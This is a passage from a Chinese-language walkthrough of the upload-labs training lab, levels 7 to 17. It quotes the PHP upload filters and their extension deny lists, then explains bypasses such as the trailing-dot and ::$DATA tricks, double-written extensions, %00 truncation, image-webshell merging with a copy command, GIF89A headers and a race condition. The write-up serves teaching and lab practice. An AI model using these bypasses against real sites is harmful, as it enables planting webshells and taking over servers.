class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>黑名单相同，对文件名进行去空和小写转换处理，但是没有通过自定义的<strong>deldot</strong>函数进行末尾去点处理，所以上传后缀名为<strong>.php.</strong>文件，windows特性上传后会自动将后缀名的点去掉</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>这关没有通过str_ireplace函数去除字符串<strong>::$DATA</strong>，在文件名后缀加上<strong>::$DATA</strong>即可绕过</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-9"><a href="#Pass-9" class="headerlink" title="Pass-9"></a>Pass-9</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>相对于前面几关而言，这关过滤的较为完善，可以看到，过滤的流程为：（1）文件名去空（2）文件名去点（3）截取最后一个点后的字符串（4）将截取的文件后缀转换为小写（4）将截取的文件名后缀去除字符串::$DATA（5）将截取的文件名后缀去空</p><p>我们可以看一下deldot函数的具体代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span><span class="params">($s)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>($i = strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">$c = substr($s,$i,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">'.'</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($c != <span class="string">'.'</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，检测流程是从文件名的最后一位开始检测，是点就去掉末位，继续向前检测，只要检测到文件名最后一位不是点，就返回过滤后的文件名，而且去点只有一次</p><p>针对上述过滤流程，我们可以构造后缀名为<strong>.php. .(点+空格+点)</strong>，经过去点过滤后的文件名为<strong>.php. （点+空格）</strong>，之后截取文件名后缀自然就绕过检测，上传的文件名最后后缀为<strong>.php.（点）</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关是将上传文件的文件名通过<strong>str_ireplace</strong>函数去除黑名单中的文件后缀，但是这个函数的缺点是只能去除一次，所以双写就能绕过，上传文件名后缀为<strong>.pphphp</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关开始采用了白名单的形式，要求上传文件名后缀名必须为jpg，png，gif，但是我们可以发现上传文件的路径是通过GET方式传递的参数<strong>save_path</strong>进行拼接的，所以在<strong>save_path</strong>末尾利用<strong>%00</strong>截断绕过</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关拼接的参数<strong>save_path</strong>是通过POST方式传递的，同样抓包修改<strong>save_path</strong>，但是因为POST不像GET能URL解码<strong>%00</strong>，所以我们需要在<strong>二进制</strong>中修改</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过读取文件的前两个字节来判断文件类型，本关的目的是上传图片马，所以利用<strong>copy</strong>命令将图片文件和php文件进行合并成图片马文件，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b + 13cmd.php/a 13cmd.jpg</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最后通过带有文件包含漏洞的文件检测图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用<strong>getimagesize</strong>函数获取文件类型是否是图片文件，跟上一关一样，可以用<strong>copy</strong>命令生成图片马，也可以在文件内容的开头加入<strong>GIF89A</strong>伪装成<strong>GIF</strong>文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样利用<strong>copy</strong>命令生成图片马或者在文件内容开头加入<strong>GIF89A</strong>即可上传图片马</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br></pre></td></tr></table></figure><p>这关规定了文件的后缀名必须是jpg，png或gif，文件类型<strong>Content-Type</strong>必须为image/jpeg，image/png或image/gif，而且上传后还经过<strong>imagecreatefromgif</strong>函数进行图片二次渲染的过程，我们可以先试着上传一个利用<strong>copy</strong>命令生成的图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到成功上传，接下来访问上传的图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出上传的图片马末尾的PHP代码经过二次渲染后发生了变化</p><p>二次渲染后的图片是会有部分内容不会发生变化的，我们可以试着上传一张完整的<strong>GIF</strong>图片，对比上传后的图片与原来的图片</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以发现开头部分内容前后是没有变化的，那么我们就在开头部分直接添加PHP代码再上传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/32.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传，再利用文件包含漏洞访问一下上传的图片马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这个方法只适合gif图片，如果是png和jpg方法较为麻烦，具体可以参考<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关先经过<strong>move_uploaded_file</strong>函数进行文件上传，再利用白名单过滤文件，如果不是图片文件再通过<strong>unlink</strong>函数将文件删除，我们可以利用条件竞争的原理，利用多线程不断上传php文件，再后台还未来得及通过<strong>unlink</strong>函数删除php文件时，访问到webshell</p><figure 